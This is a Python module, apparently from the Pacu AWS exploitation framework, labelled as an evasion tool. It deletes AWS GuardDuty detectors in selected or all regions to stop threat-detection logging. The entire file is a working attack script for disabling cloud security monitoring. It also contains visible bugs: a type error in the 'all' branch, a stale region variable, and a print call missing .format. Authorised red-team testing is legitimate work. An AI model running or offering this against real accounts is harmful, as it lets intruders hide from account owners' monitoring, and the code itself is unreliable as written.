#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import copy
import string
import random


module_info = {
    'name': 'guardduty__delete_detector',
    'author': 'Manas Bellani',
    'category': 'EVADE',
    'one_liner': 'Deletes one or more AWS Guardduty detector which can stop operations of AWS Guardduty.',
    'description': 'This module accepts a guardduty detectors, regions, and a specific id/region OR "all" params to remove all guardduty detectors on an account which disables Guardduty logging',
    'services': ['GuardDuty'],
    'prerequisite_modules': ['detection__enum_services'],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--detector-ids', '--regions'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--detector-ids', help='Comma-separated list of detector IDs to disable. Specify "all" to disable all detector-ids')
parser.add_argument('--regions', default=None, help='List (Comma-sep) of all regions to disable the detectors on. Specify "all" to disable detectors on "all" regions')


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data

    data = {'detectors': {}}

    # check either detector-ids OR regions to delete detectors in are provided
    if not args.detector_ids and not args.regions:
        print('Error: Either detector IDs or regions argument must be provided')
        return data

    detectors_regions_map = {}
    
    if fetch_data(['GuardDuty', 'Detectors'], module_info['prerequisite_modules'][0], '--guard-duty') is False:
        print('Pre-req module failed.')
        return
    detectors = copy.deepcopy(session.GuardDuty['Detectors'])

    # Read all the detectors and their region 
    for detector in detectors:
        detector_id = detector['Id']
        region = detector['Region']
        detectors_regions_map[detector_id] = region

    # Need to delete ALL detectors
    if args.regions == "all" or args.detector_ids == "all":
        data['detectors'] = detectors_regions_map.keys()
    else:
        # Add detector IDs to be deleted 
        if args.detector_ids:
            for detector_id in args.detector_ids.split(","):
                if detector_id not in detectors_regions_map:
                    print("Warning: detector_id: {} not found during enumeration".format(detector_id))
                
                data['detectors'][detector_id] = region

        # Find detectors for a given region to be deleted
        if args.regions:
            for region in args.regions.split(","):
                for detector_id, detector_region in detectors_regions_map.items():
                    if region == detector_region:
                        if detector_id not in data['detectors']:
                            data['detectors'][detector_id] = region
                            break
    
    # Show users which detectors we are deleting, and confirm.
    print("Deleting following detectors:")
    for detector_id, region in data['detectors'].items():
        print('region: {}, detector_id: {}'.format(region, detector_id))
    input("Press any key to continue...")

    # Start deleting detectors now
    for detector_id, region in data['detectors'].items():
        client = pacu_main.get_boto3_client('guardduty', region)
        try:
            client.delete_detector(
                DetectorId=detector_id
            )
            print('Deleted detector: {} in region: {} successfully!'.format(detector_id, region))
        except Exception as error:
            print("Unable to delete detector: {} in region: {}. Error: {}, {}", 
                detector_id, region, error.__class__, str(error))

    return data

def summary(data, pacu_main):
    return '{} Detector(s) selected for deletion. See STDOUT log for any errors'.format(len(data['detectors']))
